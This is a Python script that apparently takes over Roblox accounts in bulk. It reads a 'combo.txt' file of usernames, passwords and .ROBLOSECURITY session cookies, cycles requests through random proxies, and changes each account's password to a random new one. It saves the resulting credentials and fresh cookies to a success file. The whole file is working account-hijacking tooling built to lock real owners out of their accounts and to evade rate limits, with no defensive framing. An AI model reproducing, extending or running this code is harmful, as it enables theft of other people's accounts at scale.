import requests
import html
import time
import string
import random
from urllib.parse import unquote


class RobloxHelper:
    def __init__(self, cookie, proxy):
        self.session = requests.Session()
        self.session.proxies = {
            "http": "http://" + proxy.strip(),
            "https": "http://" + proxy.strip(),
        }
        self.cookie = cookie
        self.session.headers.update({
            'Cookie': f'.ROBLOSECURITY={self.cookie}',
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Referer' : 'https://www.roblox.com/'
        })
        self.csrf_token = None

    def get_csrf(self):
        response = self.session.get("https://www.roblox.com/home")
        
        value_csrf = html.unescape(response.text.split('"csrf-token" data-token="')[1].split('"')[0])
        value_csrf = unquote(value_csrf)
        self.csrf_token =  value_csrf
        self.session.headers["x-csrf-token"] = self.csrf_token

    def get_authenticated_user(self , phase):
        try:
            url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.session.get(url)
            
            if response.status_code == 200:
                user_data = response.json()
                user_id = user_data.get('id')
                return user_id
            else:
                return None
        except:
            return None

    def change_password(self, oldPassword, newPassword):
        try:
            self.session.headers["authority"] = "apis.roblox.com"
            response = self.session.get(
                "https://apis.roblox.com/hba-service/v1/getServerNonce"
            )
            self.serverNonce = response.text.split('"')[1]
            self.session.headers["authority"] = "auth.roblox.com"
            json_data = {
                "currentPassword": oldPassword,
                "newPassword": newPassword,
                "secureAuthenticationIntent": {
                    "clientPublicKey": "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEWh5du1vp9If72PPvqEGvNnlDhIduqx5lGTbqDVW3C2giiKH",
                    "clientEpochTimestamp": str(time.time()).split(".")[0],
                    "serverNonce": self.serverNonce,
                    "saiSignature": "mXSThi3U3gjW4BUvQbd/wA30JyYekQrNqCILXOmp3MOwAMvZB7J4FyBwV3rXfpLRDU6QMFf64Z4RyWR8tgOkoA==",
                },
            }

            response = self.session.post(
                "https://auth.roblox.com/v2/user/passwords/change", json=json_data
            )
            
            try:
                cookies = response.cookies[".ROBLOSECURITY"]
            except:
                cookies = 'FALSE'

            return cookies
        except:
            return 'FALSE'

def test_proxies(proxy):
    try:
        session = requests.Session()
        session.proxies = {
            "http": "http://" + proxy.strip(),
            "https": "http://" + proxy.strip(),
        }
        session.headers["authority"] = "apis.roblox.com"
        response = session.get(
            "https://apis.roblox.com/hba-service/v1/getServerNonce", timeout=5
        )
        if response.status_code == 200:
            return proxy  # Proxy works
    except requests.RequestException:
        pass  # Proxy failed, try the next one

    proxyNew = random.choice(open("proxy.txt", "r").readlines()).strip()
    return test_proxies(proxyNew)  # Recursively test the next proxy

def process_cookies(file_path, success_path, false_path, pattern_password,countPassword):
    with open(file_path, 'r') as file, \
        open(success_path, 'w') as success_out, \
        open(false_path, 'w') as false_out:
        for line in file:
            if line.strip():
                parts = line.strip().split(':_|', 1)  # Split only once
                if len(parts) > 1:
                    parts2 = parts[0].split(':')
                    idLogin = parts2[0]
                    idOldPassword = parts2[1]
                    char_set = string.ascii_letters + string.digits + "!@$*=_-!@$*=_-"
                    newPass = f'{pattern_password}{''.join(random.choice(char_set) for _ in range(countPassword))}'
                    cookies = ('_|' + parts[1])
                    print(f'*******************************************************')
                    print(f'  Change password ID : {idLogin}')
                    proxy = random.choice(open("proxy.txt", "r").readlines()).strip()
                    proxy = test_proxies(proxy)
                    helper = RobloxHelper(cookies, proxy)
                    try:
                        helper.get_csrf()  # Retrieve and set the CSRF token
                    except:
                        print(f'  GET AUTHEN FAILED BEFORE CHANGE ID : {idLogin}')
                        false_out.write(line.strip() + '\n')
                        continue
                    user_id_before = helper.get_authenticated_user('OLD')
                    if not user_id_before:
                        print(f'  GET AUTHEN FAILED BEFORE CHANGE ID : {idLogin}')
                        false_out.write(line.strip() + '\n')
                        continue

                    print(f'  WILL CHANGE ID : {idLogin} PASS: {newPass}')
                    newCookie = helper.change_password(idOldPassword,newPass)

                    if newCookie == 'FALSE':
                        print(f'  CANT CHANGE PASSWORD ID : {idLogin}')
                        false_out.write(line.strip() + '\n')
                        continue
                    
                    proxy = test_proxies(proxy)
                    newHelper = RobloxHelper(newCookie, proxy)
                    try:
                        newHelper.get_csrf()
                    except:
                        print(f'  NEED TO VALIDATE NEW PASSWORD ID : {idLogin} PASS: {newPass}')
                        false_out.write(f'{idLogin}:{newPass}' + '\n')
                        continue
                    user_id = newHelper.get_authenticated_user('NEW')
                    if user_id:
                        print(f'  SUCCESS! ID : {idLogin} PASS: {newPass}')
                        newLine = f'{idLogin}:{newPass}:{newCookie}'
                        success_out.write(newLine.strip() + '\n')
                    else:
                        print(f'  GET AUTHEN FAILED AFTER CHANGE ID : {idLogin}')
                        false_out.write(f'{idLogin}:{newPass}' + '\n')
                        false_out.write(line.strip() + '\n')

# Main function
def main():
    file_path = 'combo.txt'  # Path to the file containing the cookies
    success_path = 'result/password_success.txt'
    false_path = 'result/password_failed.txt'
    pattern_password = ''
    countPassword = 8
    process_cookies(file_path, success_path, false_path, pattern_password,countPassword)
    print(f'*******************************************************')

if __name__ == '__main__':
    main()
